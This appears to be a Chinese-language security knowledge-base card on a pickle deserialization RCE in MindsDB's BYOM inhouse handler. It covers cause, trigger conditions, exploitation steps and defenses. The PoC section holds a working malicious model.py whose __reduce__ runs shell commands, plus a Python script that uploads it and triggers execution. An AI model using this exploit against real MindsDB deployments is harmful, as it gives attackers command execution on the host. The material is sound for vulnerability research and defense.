---
id: web-python-deserialization-mindsdb-byom-model-pickle-rce
title: MindsDB BYOM 模型 pickle 反序列化 RCE：inhouse handler 上传 + train 注入 __dict__ + predict 触发
type: scenario
domain: web
path: web/python/deserialization
technique: mindsdb-byom-pickle-deserialization-rce
tags:
- mindsdb
- python
- pickle
- deserialization
- rce
- byom
- ml-engine
- ai
cve: []
severity: critical
confidence: high
status: verified
affected_versions: vulnerable-25.11.0（原文复现版本；未给出完整影响区间）
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V165
  verified_at: '2026-11-06T10:02:24+08:00'
  notes: 已对照 content.md 与唯一截图核对：PUT /api/handlers/byom 上传 type=inhouse、ModelWrapperUnsafe.train 的 pickle.dumps(__dict__, protocol=5)、predict/finetune/describe 的 pickle.loads、proc_wrapper get_input/decode、CREATE MODEL→SELECT 链及 marker PICKLE_RCE_SUCCESS 输出均一致。原文未给出 CVE/完整影响区间/修复版本，CREATE ML_ENGINE 仅文字提及、脚本未实际调用；未在本机复跑。frontmatter 无 sources/source_url。
url: /docs/web/python/deserialization/web-python-deserialization-mindsdb-byom-model-pickle-rce/
draft: false
kb_aliases:
- MindsDB RCE
- BYOM 模型
- ModelWrapperUnsafe
- pickle __reduce__
- inhouse handler
- CREATE ML_ENGINE
---

## 一句话结论

MindsDB BYOM 的 `inhouse` handler 允许通过 `PUT /api/handlers/byom/<engine>` 上传任意 Python 模型代码；`ModelWrapperUnsafe.train()` 在主进程调用用户 `train()` 后把 `self.model_instance.__dict__` 直接 `pickle.dumps()` 并持久化为模型状态，`SELECT ... FROM model` 触发 `predict()` 时再 `pickle.loads(model_state)`，攻击者在 `train()` 中注入的带 `__reduce__()` 对象随即执行任意命令。

## 原理

- **上传与注册**：
  ```http
  PUT /api/handlers/byom/<engine_name>
  Content-Type: multipart/form-data
  fields: code=model.py, modules=requirements.txt, type=inhouse
  ```
  handler 代码与依赖被保存到引擎存储；`CREATE ML_ENGINE <engine_name>`（type=`inhouse`）注册该引擎。
- **`_get_model_proxy()` 的分支**：`BYOMHandler` 在 `_get_model_proxy(version)` 中按 `engine_version_type` 选择包装器：
  - `BYOM_TYPE.INHOUSE` → `ModelWrapperUnsafe`：直接在当前进程 `import_string(code)`，没有子进程隔离；
  - `BYOM_TYPE.VENV` → `ModelWrapperSafe`：使用独立 venv/子进程隔离。
  攻击者选择 `inhouse`，即可让用户代码与模型状态都留在主进程。
- **训练阶段（注入点）**：
  ```python
  def train(self, df, target, args):
      self.model_instance.train(df, target, args)          # 用户代码执行
      return pickle.dumps(self.model_instance.__dict__, protocol=5)  # 序列化用户可控 __dict__
  ```
  用户 `train()` 中可以执行 `self.__dict__['evil'] = PickleRCE()`；`PickleRCE.__reduce__()` 返回 `(subprocess.run, (['sh','-c','...'],))`。`pickle.dumps` 会把这个对象写入 `model_state`，由 `BYOMHandler.create()` 通过 `model_storage.file_set("model", model_state)` 持久化。
- **预测阶段（触发点）**：
  ```python
  def predict(self, df, model_state, args):
      model_state = pickle.loads(model_state)   # 不安全反序列化
      self.model_instance.__dict__ = model_state
      return self.model_instance.predict(df, args)
  ```
  `SELECT * FROM model WHERE ...` 进入 `BYOMHandler.predict()`，读取 `model_storage.file_get("model")` 并传给 `model_proxy.predict()`；`pickle.loads()` 解析到 `PickleRCE` 时自动调用 `__reduce__()`，执行 `subprocess.run`。
- **其他触发面**：`finetune()`、`describe()` 也直接 `pickle.loads(model_state)`；`proc_wrapper` 的 `get_input()/decode()` 同样对 stdin 数据 `pickle.loads()`。任何能到达这些方法的 API 都可作为触发点，核心都是“把用户可控数据当 pickle 解析”。
- **为什么成立**：`inhouse` 模式的定位是“在当前进程执行 learn/predict”，但它把用户上传的代码与 pickle 状态放在同一信任域；pickle 的反序列化会执行 `__reduce__` 指定的任意 callable，因此模型状态不是数据，而是代码。即使上传模型代码是产品功能，攻击者也可以把 payload 藏在持久化的 `model_state` 中，在训练后的任意预测/微调/描述请求时触发，并获得与 MindsDB 进程相同的权限。
- **与 ModelWrapperSafe 的对比**：`venv` 模式把用户代码放到独立子进程/环境，降低主进程被直接控制的风险；`inhouse` 没有这层隔离，是漏洞成立的关键配置。

## 触发条件

- MindsDB 版本为原文复现的 `vulnerable-25.11.0`（文章未给出完整影响区间，需按实际版本确认）。
- 目标开放 `/api/handlers/byom/` 上传接口与 SQL 查询接口（默认监听 `47334`，文章中未使用认证头）。
- 允许 `type=inhouse`（`_inhouse_enabled` 未关闭）且 BYOM handler 上传功能启用。
- 攻击者能执行 `CREATE ML_ENGINE`、`CREATE MODEL` 与 `SELECT`，并触发模型训练/预测。
- MindDB 进程有权限执行系统命令、写入临时目录/文件。

## 利用步骤

1. 访问 `GET /api/databases/` 确认 MindsDB 服务存活与版本。
2. 构造恶意 `model.py`：定义 `PickleRCE.__reduce__()` 执行命令，定义 `ExploitModel.train()` 把 `PickleRCE()` 放入 `self.__dict__`，`predict()` 返回 df。
3. `PUT /api/handlers/byom/<engine>` 上传 `code` 与 `modules`（`requirements.txt`），`type=inhouse`；按版本需要再执行 `CREATE ML_ENGINE <engine> ... type='inhouse'`。
4. 执行 `CREATE MODEL <model> FROM files (SELECT ...) PREDICT ... USING engine='<engine>'`；训练阶段调用用户 `train()` 并 `pickle.dumps(__dict__)`，恶意对象随模型状态落盘。
5. 轮询 `SELECT status FROM models WHERE name='<model>'` 直到 `complete`。
6. 执行 `SELECT * FROM <model> WHERE ...`；`predict()` 的 `pickle.loads()` 触发 `__reduce__`，命令执行（写 marker、反弹 shell 等）。
7. 通过 marker 文件、命令回显或外带通道确认 RCE；清理模型/引擎。

## PoC

```python
# 恶意 model.py（上传到 BYOM handler）
import subprocess

class PickleRCE:
    def __reduce__(self):
        return (
            subprocess.run,
            (['sh', '-c', 'echo PICKLE_RCE_$(date) > /tmp/MINDSDB_PICKLE_RCE && id >> /tmp/MINDSDB_PICKLE_RCE'],),
        )

class ExploitModel:
    def train(self, df, target, args=None):
        self.__dict__['evil'] = PickleRCE()
        self.__dict__['trained'] = True
        return None

    def predict(self, df, args=None):
        return df
```

```python
import requests

TARGET = "http://127.0.0.1:47334"
ENGINE = "exploit_engine"
MODEL = "exploit_model"

# 1) 上传恶意 handler
with open("model.py", "rb") as code, open("requirements.txt", "rb") as modules:
    r = requests.put(
        f"{TARGET}/api/handlers/byom/{ENGINE}",
        files={"code": ("model.py", code, "text/plain"),
               "modules": ("requirements.txt", modules, "text/plain")},
        data={"type": "inhouse"},
        timeout=60,
    )
print("upload:", r.status_code, r.text[:200])

# 2) 创建模型，触发 train() -> pickle.dumps(恶意 __dict__)
sql_create = f"""
CREATE MODEL {MODEL}
FROM files
(SELECT * FROM test_18 LIMIT 5)
PREDICT content
USING engine = '{ENGINE}'
"""
print(requests.post(f"{TARGET}/api/sql/query", json={"query": sql_create}, timeout=120).text[:300])

# 3) 查询模型，触发 predict() -> pickle.loads() -> __reduce__()
sql_predict = f"SELECT * FROM {MODEL} WHERE content = 'test'"
print(requests.post(f"{TARGET}/api/sql/query", json={"query": sql_predict}, timeout=120).text[:300])
```

说明：以上为按原文利用脚本整理的结构化 PoC，未在本机执行；实际字段/初始化数据需按目标环境调整，`CREATE ML_ENGINE` 是否已由 PUT 自动完成取决于版本。文章截图显示 `vulnerable-25.11.0` 上 marker 文件写入成功并包含 `PICKLE_RCE_SUCCESS_...`。

## 变体与关联

- **触发点变体**：`predict()`、`finetune()`、`describe()` 的 `pickle.loads`；`proc_wrapper` 的 `get_input()/decode()` stdin 反序列化；任何把用户可控 bytes 传入 pickle 的 API。
- **payload 变体**：`__reduce__` 返回 `os.system`、`subprocess.run`、`eval`、`builtins.exec`；可写文件、反弹 shell、下载二阶段；`protocol=5` 只是序列化协议版本，不影响执行。
- **配置变体**：`type=venv`/`ModelWrapperSafe` 会把用户代码隔离到子进程；若目标只允许 venv，利用难度提高。`inhouse` 开关、handler 上传权限、认证策略决定可达性。
- **同类模型格式风险**：PyTorch `torch.load`、joblib、HuggingFace pickle 模型、ComfyUI `torch.load` 等；都是“模型文件即代码”，与本文的 BYOM 状态 pickle 同类。
- **关联卡片**：[[web-python-deserialization-comfyui-loadtrainingdataset-torch-load-pickle-rce]]（ComfyUI 模型 pickle）、[[ai-security-supply-chain-huggingface-pickle-model-reverse-shell]]（HuggingFace pickle 模型）、[[web-python-deserialization-pickle-pydoc-pipepager-short-blacklist-bypass]]（pickle 黑名单绕过）、[[ai-security-agent-security-crewai-filewriter-picklehandler-chain-rce]]（Agent 框架 pickle 链）。
- **边界**：若服务端已禁用 inhouse、限制 BYOM 上传、把模型状态改为 JSON/safetensors 等安全格式，或在独立低权限容器中执行，则本链不成立；攻击需要能访问 handler/SQL API。

## 检测与防御

- **升级/修复**：升级到修复该问题的 MindsDB 版本；文章未给出修复 commit/版本，需以官方 advisory 为准。
- **禁止不可信 pickle**：模型状态、进程间通信、缓存不要用 `pickle.loads` 处理用户可控数据；改用 JSON/MessagePack/ONNX/safetensors 等无代码执行能力的格式。
- **隔离 inhouse**：默认禁用 `inhouse` BYOM，或把用户代码、模型训练/预测放进独立低权限容器/子进程（`venv`/`ModelWrapperSafe`），限制文件系统、网络与子进程；不要把 MindDB 主进程的凭据暴露给模型代码。
- **权限与网络**：BYOM handler 上传、`CREATE ML_ENGINE`、`CREATE MODEL` 需要认证与角色授权；MindsDB API 不暴露公网，限制 `/api/handlers/byom/` 与 `/api/sql/query` 的来源。
- **检测信号**：`PUT /api/handlers/byom/*` 后紧跟 `CREATE MODEL`/`SELECT`；handler 代码中出现 `__reduce__`、`subprocess`、`os.system`、`eval`、`/tmp` marker；模型状态文件出现 pickle magic（`\x80\x05` 等）且内容高熵；MindsDB 进程派生 `sh`/`python` 子进程、异常写文件/外连。
- **响应**：删除恶意模型/引擎、隔离主机、检查 `/tmp` marker 与子进程、轮换 MindsDB 配置中的数据库/云凭据、升级版本并收紧 BYOM 权限。
